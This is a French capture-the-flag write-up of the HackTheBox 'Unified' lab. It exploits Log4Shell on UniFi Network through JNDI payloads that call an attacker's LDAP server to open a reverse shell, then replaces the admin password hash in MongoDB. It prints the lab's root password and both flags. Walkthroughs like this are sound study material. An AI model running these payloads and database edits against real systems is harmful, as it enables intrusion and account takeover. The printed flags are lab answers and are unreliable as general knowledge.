# Write-up -- HackTheBox : Unified

Write-up réalisé pour la machine Unified de HackTheBox. L'objectif est d'exploiter Log4Shell sur une instance vulnérable de UniFi Network, puis de manipuler directement la base de données MongoDB pour modifier le mot de passe admin et récupérer les credentials root stockés en clair dans l'interface.

L'IP de la machine pendant ma session était `10.129.90.61`.

---

## 1. Scan des ports ouverts

```bash
nmap -sV -sS 10.129.90.61
```

```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
6789/tcp open  ibm-db2-admin?
8080/tcp open  http            Apache Tomcat (language: en)
8443/tcp open  ssl/nagios-nsca Nagios NSCA
```

Les quatre premiers ports ouverts sont **22, 6789, 8080 et 8443**.

---

## 2. Identification du logiciel sur le port 8443

On affine le scan sur le port 8443 avec détection de scripts et d'OS :

```bash
nmap -A -sC -p 8443 10.129.90.61
```

```
8443/tcp open  ssl/nagios-nsca Nagios NSCA
| http-title: UniFi Network
|_Requested resource was /manage/account/login?redirect=%2Fmanage
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc.
```

Le port 8443 héberge **UniFi Network**, le logiciel de gestion de réseau de Ubiquiti. On y accède via :

```
https://10.129.90.61:8443/manage/account/login?redirect=%2Fmanage
```

---

## 3. Version du logiciel

En visitant la page de login, la version est affichée directement sous le logo UniFi : **6.4.54**.

---

## 4. CVE identifiée

Une recherche sur "CVE UniFi 6.4.54" pointe immédiatement vers la **CVE-2021-44228**, mieux connue sous le nom de **Log4Shell**. Il s'agit d'une vulnérabilité critique dans la bibliothèque de logging Java Log4j, qui permet une exécution de code à distance (RCE).

---

## 5. Protocole utilisé par JNDI dans l'injection

Log4Shell exploite **JNDI** (Java Naming and Directory Interface), une API Java permettant de récupérer dynamiquement des objets depuis un serveur distant au moment où un message est écrit dans les logs. Le problème : Log4j interprète les chaînes de type `${jndi:ldap://serveur-attaquant.com/Exploit}` directement à l'intérieur des messages loggés, sans aucune validation.

Le protocole privilégié est **LDAP** : il passe généralement les pare-feux sans encombre et permet nativement de stocker et distribuer des objets Java.

---

## 6. Outil d'interception du trafic

Pour vérifier que le serveur cible rappelle bien notre machine après injection du payload, on utilise **tcpdump**, l'équivalent de Wireshark en ligne de commande, pour intercepter le trafic entrant.

---

## 7. Port à inspecter

Le protocole LDAP utilise par défaut le port **389**. C'est sur ce port qu'on surveille les connexions entrantes pour confirmer que l'injection a bien été interprétée par le serveur vulnérable.

---

## 8. Port de MongoDB et exploitation de Log4Shell

On passe à l'exploitation en utilisant le dépôt [Log4jUnifi](https://github.com/puzzlepeaches/Log4jUnifi), qui automatise l'attaque complète :

```bash
sudo apt update && sudo apt install openjdk-11-jre maven
git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jUnifi
cd Log4jUnifi && pip3 install -r requirements.txt
mvn package -f utils/rogue-jndi/
```

Le mécanisme de l'exploit : le script injecte un payload JNDI dans le champ `username` de la page de login. Quand UniFi écrit ce nom dans ses logs via Log4j, la bibliothèque interprète la chaîne comme une commande, contacte notre serveur LDAP malveillant, et récupère un objet Java qui ouvre un reverse shell.

On démarre notre listener :

```bash
nc -lvnp 4444
```

Puis on lance l'exploit :

```bash
python3 exploit.py -u https://10.129.90.61:8443 -i 10.10.15.30 -p 4444
```

```
[*] Starting malicous JNDI Server
{"username": "${jndi:ldap://10.10.15.30:1389/o=tomcat}", "password": "log4j", ...}
[*] Firing payload!
[*] Check for a callback!
```

La connexion arrive sur le listener. On cherche ensuite sur quel port tourne MongoDB :

```bash
ps -aux | grep mongo
```

```
unifi  67  bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --bind_ip 127.0.0.1
```

MongoDB tourne sur le port **27117**.

---

## 9. Base de données par défaut de UniFi

On se connecte au client MongoDB en précisant le port :

```bash
mongo --port 27117
```

```
> show databases;
ace       0.002GB
ace_stat  0.000GB
admin     0.000GB
config    0.000GB
local     0.000GB
```

La base de données utilisée par les applications UniFi est **`ace`**.

---

## 10. Enumération des utilisateurs dans MongoDB

On sélectionne la base `ace` et on cherche la collection des administrateurs :

```
> use ace;
> show tables;
> db.admin.find()
```

La fonction pour lister les documents d'une collection est **`find()`**. Le résultat révèle le compte `administrator` avec son hash de mot de passe stocké dans le champ `x_shadow` :

```
"name" : "administrator"
"x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M..."
```

---

## 11. Modification du mot de passe admin dans MongoDB

Plutôt que de cracker le hash, on va directement le remplacer par un hash qu'on contrôle. On génère un hash SHA-512 de notre choix :

```bash
mkpasswd -m sha-512 mdp123
# $6$J.buFndGYS4Kfqi8$KuzOgitgm0UWzu6PyL3T3.u8huim0J055rDMnbRQRDPZTX/.RG1BL2TTRc0o0kqA4S25xbn15lQJXHxNzlayb1
```

La fonction MongoDB pour modifier un document existant est **`update()`**. On remplace le `x_shadow` de l'admin :

```javascript
db.admin.update(
    {"name" : "administrator"},
    {$set : {"x_shadow" : "$6$J.buFndGYS4Kfqi8$KuzOgitgm0UWzu6PyL3T3.u8huim0J055rDMnbRQRDPZTX/.RG1BL2TTRc0o0kqA4S25xbn15lQJXHxNzlayb1"}}
)
```

On peut maintenant se connecter à l'interface UniFi avec `administrator` / `mdp123`.

---

## 12. Mot de passe root

Une fois connecté à l'interface UniFi en tant qu'administrateur, on parcourt les paramètres du site. En bas de la section des paramètres, le mot de passe root est affiché en clair :

**Mot de passe root :** `NotACrackablePassword4U2022`

---

## 13. Flag user

```bash
cd /home/michael
cat user.txt
```

**Flag user :** `6ced1a6a89e666c0620cdb10262ba127`

---

## 14. Flag root

Avec le mot de passe root trouvé dans l'interface, on se connecte directement en SSH :

```bash
ssh root@10.129.90.61
# root@10.129.90.61's password: NotACrackablePassword4U2022
```

```bash
root@unified:~# cat /root/root.txt
e50bc93c75b634e4b272d2f771c33681
```

**Flag root :** `e50bc93c75b634e4b272d2f771c33681`
